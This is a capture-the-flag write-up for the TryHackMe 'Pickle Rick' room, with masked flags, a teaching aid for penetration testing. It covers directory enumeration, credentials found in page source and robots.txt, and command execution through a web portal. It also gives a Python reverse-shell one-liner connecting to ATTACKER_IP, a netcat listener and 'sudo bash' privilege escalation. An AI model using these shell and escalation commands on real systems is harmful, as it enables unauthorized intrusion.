# TryHackMe – Pickle Rick Writeup

## Overview

This room focuses on **web enumeration, credential discovery, command execution, and privilege escalation**.  
The objective is to discover hidden credentials, gain command execution through the web portal, and retrieve the three secret ingredients required for Rick’s potion.

---

# Lab Setup

Open the TryHackMe website:

https://tryhackme.com/

Steps:

1. Click **Practice**
2. Click **Challenges**
3. Search **Pickle Rick**
4. Click **Join Room**
5. Click **Start Machine**

Assume the target machine IP:

```
10.49.178.72
```

---

# Connecting Kali to TryHackMe VPN

Connect Kali Linux to the TryHackMe VPN.

```bash
cd /home/student/Downloads
sudo apt install openvpn
sudo openvpn <ovpn file path>
```

---

# Task 1 – Deploy the Machine

Start the machine from the TryHackMe interface.

---

# Task 2 – Reconnaissance

## Step 1 – Visit the Website

Open the target IP in a browser:

```
http://10.49.178.72
```

Read the page carefully and **view the page source**.

You can view the source using:

```
CTRL + U
```

### Result

A commented section reveals a username.

```html
<!--
Note to self, remember username!
Username: **
-->
```

This confirms the **login username**.

---

# Step 2 – Searching for the Password

The webpage hints that the password was stored somewhere on the system.

To locate files and directories, perform **directory enumeration using Gobuster**.

```bash
export IP=10.49.178.72

gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
```

### Result

Gobuster identifies several directories and files.

```
**
**
**
**
**
**
```

Important paths include:

- `/login.php`
- `/portal.php`
- `/assets`
- `/robots.txt`

---

# Step 3 – Discovering the Password

Open the robots file:

```
http://10.49.178.72/robots.txt
```

### Result

```
**
```

This value serves as the **login password**.

---

# Step 4 – Logging into the Portal

Navigate to:

```
http://10.49.178.72/login.php
```

Login credentials:

```
Username: **
Password: **
```

After authentication, a **command input portal** becomes available.

However, only limited commands execute successfully.

---

# Step 5 – Obtaining a Reverse Shell

Use a Python reverse shell to gain command-line access.

Example payload:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Replace:

```
ATTACKER_IP → Your Kali tun0 IP
1234 → Listening port
```

Start a Netcat listener on Kali Linux.

```bash
sudo nc -lnvp 1234
```

Once executed, a reverse shell is established.

---

# Step 6 – Upgrade the Shell

Spawn an interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

You now have access as the **www-data user**.

---

# Question 1 – First Ingredient

Search the current directory for files.

```bash
ls
cat Sup3rS3cretPickl3Ingred.txt
```

Answer

```
**
```

---

# Question 2 – Second Ingredient

Check sudo permissions and escalate privileges.

```bash
sudo bash
```

Navigate to the user's home directory.

```bash
cd /home/rick
ls
cat *
```

Answer

```
**
```

---

# Question 3 – Final Ingredient

Locate the final ingredient file.

```bash
cat 3rd.txt
```

Answer

```
**
```

---

# Key Learning Points

This room demonstrates important penetration testing techniques:

- Source code inspection for hidden credentials
- Web directory enumeration using **Gobuster**
- Discovering sensitive information in **robots.txt**
- Command execution through vulnerable web portals
- Establishing reverse shells
- Privilege escalation using misconfigured permissions

---

# Disclaimer

This write-up is intended for **educational purposes only**.  
Sensitive answers and flags have been intentionally hidden to comply with the platform's learning policy.